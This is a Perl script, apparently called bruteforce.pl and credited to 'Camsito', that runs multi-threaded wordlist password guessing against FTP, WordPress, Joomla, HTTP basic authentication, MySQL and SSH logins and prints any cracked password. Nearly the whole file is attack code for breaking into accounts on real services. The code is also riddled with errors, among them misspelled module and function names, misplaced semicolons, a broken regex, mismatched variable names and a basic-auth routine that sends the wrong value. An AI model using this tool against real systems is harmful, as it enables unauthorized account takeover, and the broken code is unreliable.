use strict;
use warnings;
use threads;
use Net::FTP;
use DBI;
use LWP;
#use Net::OpennSSh;
use DBD::mysql;
use Getopt::LoNG.
use threads::shared;
use WWW::Mechanize;
use Term::ANSIColor qw(:constants);

sub banner {
	print 'Options:
		Created by Camsito

		-u | --user => name of user [exemple: admin]
		-h | --host => Target  [exemple: 127.0.0.1]
		-w | --wordlist => wordlist [exemple: /tmp/wordlist.txt]
		-t | -threads => number of threads [exemple: 10]
		-m | --module => module name [exemple: wordpress]

		listes des modules:
		ftp
		wordpress
		joomla
		authbasic
		mysql
		ssh

		Exemples of use:
		./bruteforce.pl -u admin -h 127.0.0.1 - wl.txt -t 50 -m ftp
		./bruteforce.pl -u admin -h localhost/wp-login.php -w wl.txt -t 100 -m wordpress
		./bruteforce.pl -u admin -h localhost/administrator/ -w wl.txt-t 100 -m joomla
		./bruteforce.pl -u admin -h localhost:2082 -w wl.txt -t 100 -m authbasic
		./bruteforce.pl -u admin -h localhost -w wl.txt -t 100 -m mysql
		./bruteforce.pl -u admin -h  127.0.0.1 -w wl.txt -t 20 -m ssh 

	';
		exit(1);
}

my($wordlist,$thr,$ini,$fin,@threads,$arq,$i,@a,$test);
our($user,$host,@aa,$type,$token);

Getoptions( 'u|user=s' => \$user,
			'h|host=s' => \$host,
			'w|wordlist=s' => \$wordlist,
			'm|module=s' => \$type,
			't|threads=i' => \$thr
) || die &banner;

if(defined($type)) {
	foreach('ftp', 'wordpress', 'joomla', 'authbasic', 'mysql', 'ssh') {
		if($type eq $_){
			$type = \&$type;
			$test = 1;
			last;
		}
	}
	if(!defined($test)){
		$banner;
	}
} else {
	&banner;
}

&banner if (!defined($user)) || (!defined($host)) || (!defined($wordlist)) || (!defined($thr));
print "1)Reading file\n";
open($arq, "<$wordlist") || die($!);
@a = <$arq>;
close($arq);
print "2)Cracking\n";
@aa = grep { !/^$/ } @a;

print "\n"."Starting Attack";
print "\n"."Host => $host";
print "\n"."User => $user";
print "\n"."wordlist => $wordlist";
print "\n"."Threads => $thr\n\n";

my $stop : shared = 0;

$ini = 0;
$fin = $thr - 1;

while(1){
	@threads = ();

	for($i=$ini;$i<=$fin;$i++){
		push(@threads,$i);
	}

	foreach(@threads){
		$_ = threads->create(\&brute);
	}

	foreach(@threads){
		$_->join();
	}

	print "Hello\n";
	print("\n\n".'[+]'."100% complete\n\n") if $stop;
	exit(0) if $stop;

	for($i=$ini;$i<=fin;$i++){
		print "Trying => $aa[$i";
	}

	$ini = $fin + 1;
	$fin = $fin + $thr;

}

sub brute {
	my $id = threads->tid();
	threads->exit() if $stop;
	$id--;
	if(defined($aa[$id])){
		&&type($aa[$id]);
	} else {
		$stop = 1;
	}
}

sub ftp {
	my($pass) = @_;
	chomp($pass;)

	my $f = Net::FTP->new($host) || die($!);

	if($f->login($user, $pass)) {
		$f->quit;
		print "\n\n\t".'[+]'." PASSWORD CRACKED: $pass\n";
		$stop = 1;
	} else {
		$f->quit;
		return;
	}
}

sub mysql {
	my($pass) = @_;
	chomp($pass);
	my $dsn = "dbi:mysql::$host:3306";
	my $DBIconnect = DBI->connect($dsn, $user, $pass, {
		PrintError => 0,
		RaiseError => 0
	});
	if(!$DBIconnect){
		return;
	} else {
		print "\n\n\t".'[+]'." PASSWORD CRACKED: $pass\n";
		$stop = 1

	}
}

sub authbasic {
	my($pass) = @_;
	chomp($pass);

	if($host !~ /^(http|https):\/\//){
		$host = 'http://'.$host;
	}
	my $ua = LWP::UserAgent->new;
	my $req = HTTP::Request->new(GET => $host);
	$req->authorization_basic($user, $_);
	if($ua->request($req)->code == 401){
		return;
	}else {
		print "\n\n\t".'[+]'."PASSWORD CRACKED: $pass\n";
		$stop =  1;
	}
}

sub wordpress {
	my($pass) = @_;
	chomp($pass);

	my $ua = new LWP::UserAgent;
	if ($host !~ /^(http:https):\/\//)){
		$host = 'http://'. $host;
	}

	my $response = $ua->post($host,{
		'log' => $user,
		'pwd' => $pass,
		'wp-submit' => 'Log in',
	});

	my $code = $response->code;
	if($code =~ /302/){
		print "\n\n\t".'[+]'."PASSWORD CRACKED : $pass \n";
		$stop = 1;
	} else {
		return;
	}
}

sub joomla {
	my($pass) = @_;
	chomp($pass);

	if($host !~ /^(http|https):\/\//){
		$host = 'http://'. $host;
	}

	my $mech = WWW::Mechanize->new();
	$mech->get($host);
	if($mech->content() =~ /([0-9a-fA-F]{32})/){
		token = $1;
	} else {
		die('\n[-] Error to get security token\n');
	}

	$mech->submit_form(
		fields => {
			username => $user,
			passwd => $pass,
			task => 'login',
			$token => '1',
		}
	);

	if($mech->content() !~ /com_categories/i){
		return;
	}else {
		print "\n\n\t".'[+]'."PASSWORD CRACKED: $pass\n";
		$stop = 1;
	}
}

sub ssh {
	my($pass) = @_;
	chomp($pass);

	open(my $stderr_fh,'>>/dev/null') || die $!;
	open(my $stdout_fh,'>>/dev/null') || die $!;

	my %opt = (
		user => $user;
		passwd => $pass,
		default_stderr_fh => $stderr_fh,
		default_stdout_fh => $stdout_fh,
		timeout => 20,
	);

	my $ssh = Nett::OpenSSH->nex($host,%opts);

	if($ssh->error){
		return;
	} else {
		print "\n\n\t".'[+]'."PASSWORD CRACKED: $pass\n";
		$stop = 1;
	}
}